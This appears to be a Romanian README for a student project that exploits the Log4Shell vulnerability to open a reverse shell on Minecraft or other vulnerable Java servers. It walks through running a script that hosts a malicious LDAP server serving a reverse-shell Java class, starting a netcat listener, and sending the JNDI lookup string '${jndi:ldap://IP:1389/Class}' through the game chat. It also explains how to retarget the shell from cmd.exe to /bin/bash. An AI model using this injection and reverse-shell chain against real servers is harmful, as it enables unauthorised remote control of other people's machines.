# Log4shell

## Descriere

Acest proiect exploateaza vulnerabilitatea Log4shell. Este destinat folosirii lui pentru a ataca un server vulnerabil de Minecraft, joc video foarte popular. Insa poate fi folosit pentru atacul oricarui server neprotejat de acest atac.

Proiectul este capabil sa initieze o conexiune de tip reverse shell.

## Dependinte

### Sistemul atacatorului

Proiectul este construit sa functioneze pe un sistem Kali Linux. Acesta are deja instalate urmatoarele programe necesare: Python3, Netcat, Git.

Pentru a instala Kali accesati [pagina oficiala](https://www.kali.org/docs/installation/hard-disk-install/) a softwareului.

In reproducerea atacului am folosit [Virtualbox](https://www.virtualbox.org/wiki/Downloads) pentru a virtualiza masina de Kali Linux. [Tutorial](https://www.kali.org/docs/virtualization/install-virtualbox-guest-vm/) 

In ambele scenarii de instalare a sistemului Kali trebuie asigurata conexiunea la retea cu masina dorita sa fie atacata.

### Sistemul atacatat

In fisiere se pot regasii pachetele Java vulnerabile pentru Windows si Linux(Debian). In functie de sistemul ales se descarca aplicatia respectiva (Fisierul .tar.gz pentru Debian, Fisiserul .exe pentru Windows).

Pentru versiunea Minecraft vulnerabila se recomanda descarcarea de pe [acest link](https://mcversions.net/download/1.8.8). Acest fisier .jar va fi executat pe masina vulnerabila dorita. [How to](https://help.minecraft.net/hc/en-us/articles/360058525452-How-to-Setup-a-Minecraft-Java-Edition-Server)

## Executarea exploitului

* Dupa ce se cloneza acest repository, se intra in folderul lui.

* Urmatoarea caseta explica cum trebuie executat scripul de Python:
```
usage: application.py [-h] [--ip IP] [--port PORT]
                      [--nume_clasa NUME_CLASA]

Un script care primește IP-ul, portul și numele clasei java. Usage: python3
application.py --ip <IP> --port <Port> --nume_clasa <Nume>

optional arguments:
  -h, --help            show this help message and exit
  --ip IP               Adresa IP a serveului LDAP
  --port PORT           Portul Netcat
  --nume_clasa NUME_CLASA Clasa java
```
<\IP> - Ip-ul masinii atacate
<\Port> - Portul unde este acultata conexiunea reverse shell (ex:9999)
<\Nume> - Numele dorit pentru clasa java reverse shell generata

* Dupa rulare, va exista un server malitios valabil pentru a injecta clasa java ce initiaza o conexiune reverse shell.

### Observatii!

Scriptul este configurat pentru a ataca o masina Windows. Pentru atacul unei masini Linux trebuie schimbat in script programul Java. Se cauta in fisier "cmd.exe" si se inlocuieste cu "/bin/bash".

* Netcat

Pornirea unei instante separate netcat. Asculta pentru o conexiune reverse shell.
```
nc -lvnp 9999
```

Aici va fi gasita linia de comanda a sistemului atacata

## Injectare si rezultate

In consola, unde scriptul python ruleaza, se va afisa comanda necesara ce trebuie introdusa in sistemul vulnerabil. Cum ar trebuii sa arate comanda: `${{jndi:ldap://{args.ip}:1389/{args.nume_clasa}}`

Pentru serverul de Minecraft trebuie sa ne conectam cu un client. Dupa conexiunea la sever a clientului se introduce comanda anterioara.

In final ar trebui sa avem o conexiune de terminal in fereastra cu Netcat.

## Autor

Gheorghita Dan 
@Universitatea Politehnica Timisoara